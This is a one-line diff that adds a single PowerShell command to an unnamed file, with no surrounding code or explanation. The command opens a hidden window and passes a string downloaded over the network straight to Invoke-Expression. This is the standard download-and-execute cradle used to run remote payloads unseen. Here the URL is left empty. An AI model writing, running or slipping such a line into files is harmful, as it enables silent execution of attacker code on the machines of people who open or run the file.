@@ -1,0 +1,1 @@
+﻿powershell.exe -windowstyle hidden Invoke-Expression (New-Object System.Net.WebClient).DownloadString("")
